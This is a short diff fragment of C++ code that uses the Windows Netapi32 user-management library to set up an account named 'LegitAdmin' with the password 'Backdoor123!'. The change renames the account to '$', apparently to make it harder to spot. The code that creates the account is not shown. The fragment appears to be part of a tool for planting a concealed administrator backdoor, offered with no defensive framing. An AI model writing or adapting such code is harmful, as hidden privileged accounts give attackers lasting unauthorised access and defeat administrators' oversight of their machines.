@@ -3,7 +3,7 @@
 #include <LM.h>
 #pragma comment(lib,"Netapi32.lib")
 using namespace std;
-wstring name = L"LegitAdmin";
+wstring name = L"$";
 LPWSTR lpName = const_cast<wchar_t*>(name.c_str());
 wstring password = L"Backdoor123!";
 LPWSTR lpPassword = const_cast<wchar_t*>(password.c_str());
